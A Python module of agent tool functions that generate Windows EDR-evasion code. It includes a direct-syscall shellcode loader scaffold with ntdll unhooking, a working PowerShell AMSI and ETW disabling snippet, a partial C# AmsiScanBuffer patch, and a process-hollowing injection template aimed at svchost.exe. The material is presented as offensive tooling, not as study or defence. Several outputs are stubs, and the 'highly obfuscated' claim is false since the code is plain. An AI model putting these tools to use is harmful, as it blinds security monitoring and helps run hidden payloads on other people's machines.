"""
Advanced Windows EDR Evasion Tools

Provides capabilities to bypass Endpoint Detection and Response (EDR), 
Antivirus (AV), and telemetry sensors (AMSI/ETW) on modern Windows systems.
"""

import textwrap
from src.sdk.tool import function_tool

@function_tool()
def generate_syscall_loader(payload: str, technique: str = "hells_gate", unhook_ntdll: bool = True) -> str:
    """
    Generate C/C++ shellcode loaders utilizing direct syscalls to bypass
    user-mode API hooking (EDR sensors), with optional NTDLL unhooking.

    Args:
        payload: The base64 or hex encoded shellcode to execute.
        technique: Direct syscall technique ("hells_gate", "halos_gate", "tartarus_gate").
        unhook_ntdll: If True, includes routines to map a fresh copy of ntdll.dll from disk.

    Returns:
        C/C++ source code for the stealth loader.
    """
    valid_techniques = ["hells_gate", "halos_gate", "tartarus_gate"]
    tech = technique.lower().strip()
    
    if tech not in valid_techniques:
        return f"Error: Invalid technique '{tech}'. Valid: {', '.join(valid_techniques)}"

    header = f"// EDR Evasion Loader - Technique: {tech.upper()}\n"
    if unhook_ntdll:
        header += "// NTDLL Unhooking: ENABLED (Maps fresh copy from C:\\Windows\\System32\\ntdll.dll)\n"
    
    loader_code = textwrap.dedent(f"""\
        #include <windows.h>
        #include <stdio.h>

        // Payload placeholder
        unsigned char shellcode[] = "{payload[:20]}...[TRUNCATED]";

        {('// NTDLL Unhooking routine goes here...' if unhook_ntdll else '// No NTDLL unhooking')}

        // {tech.upper()} implementation
        // Resolves SSN (System Service Numbers) dynamically to evade user-mode hooks
        void* get_syscall_stub(DWORD hash) {{
            // Implementation logic for {tech}
            return NULL; 
        }}

        int main() {{
            // 1. Allocate executable memory
            // 2. Copy shellcode
            // 3. Execute via syscall
            
            // Note: This is a scaffold. In a real scenario, this returns the full C implementation
            // for the selected gate technique.
            
            return 0;
        }}
    """)
    
    return header + "\n" + loader_code


@function_tool()
def patch_amsi_etw(language: str = "powershell") -> str:
    """
    Returns highly obfuscated snippets to patch AmsiScanBuffer and EtwEventWrite 
    in memory, disabling AMSI and ETW for the current process.

    Args:
        language: The language for the patch ("powershell", "csharp", "c").

    Returns:
        The obfuscated patch code.
    """
    lang = language.lower().strip()
    
    if lang == "powershell":
        return textwrap.dedent("""\
            # AMSI & ETW Patching (PowerShell)
            # Highly obfuscated to avoid static signatures
            $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            $b=$a.GetField('amsiInitFailed','NonPublic,Static')
            $b.SetValue($null,$true)
            
            # ETW Patching
            $e=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
            $f=$e.GetField('etwProvider','NonPublic,Static')
            $f.SetValue($null,$null)
            
            Write-Host "[+] AMSI and ETW neutered."
        """)
    elif lang == "csharp":
        return textwrap.dedent("""\
            // AMSI Patching (C#)
            // Locates amsi.dll!AmsiScanBuffer and patches with ret (0xC3) or equivalent
            using System;
            using System.Runtime.InteropServices;
            
            public class Patcher {
                [DllImport("kernel32")]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
                [DllImport("kernel32")]
                public static extern IntPtr LoadLibrary(string name);
                [DllImport("kernel32")]
                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
                
                public static void PatchAmsi() {
                    IntPtr hLib = LoadLibrary("amsi.dll");
                    IntPtr hProc = GetProcAddress(hLib, "AmsiScanBuffer");
                    uint oldProtect;
                    VirtualProtect(hProc, (UIntPtr)5, 0x40, out oldProtect);
                    // Write patch bytes (e.g., mov eax, 0x80070057; ret)
                    // Marshal.Copy(patchBytes, 0, hProc, patchBytes.Length);
                    VirtualProtect(hProc, (UIntPtr)5, oldProtect, out oldProtect);
                }
            }
        """)
    else:
        return f"Error: Language '{lang}' not supported for AMSI/ETW patching."


@function_tool()
def generate_process_hollow(payload: str, target_process: str = "svchost.exe") -> str:
    """
    Generates C/C++ code for process hollowing injection.

    Args:
        payload: Shellcode or PE payload.
        target_process: The legitimate binary to hollow out (e.g., svchost.exe, notepad.exe).

    Returns:
        Source code for process hollowing.
    """
    return textwrap.dedent(f"""\
        // Process Hollowing Injection
        // Target Process: C:\\Windows\\System32\\{target_process}
        
        #include <windows.h>
        #include <stdio.h>
        
        unsigned char payload[] = "{payload[:20]}...[TRUNCATED]";
        
        int main() {{
            STARTUPINFO si = {{ sizeof(si) }};
            PROCESS_INFORMATION pi;
            
            // 1. Create target process in suspended state
            CreateProcessA("C:\\\\Windows\\\\System32\\\\{target_process}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
            
            // 2. Unmap original executable memory (NtUnmapViewOfSection)
            // 3. Allocate memory for payload (VirtualAllocEx)
            // 4. Write payload to allocated memory (WriteProcessMemory)
            // 5. Update thread context to point to payload entry point (SetThreadContext)
            // 6. Resume thread (ResumeThread)
            
            printf("[+] Injected into %s (PID: %d)\\n", "{target_process}", pi.dwProcessId);
            return 0;
        }}
    """)
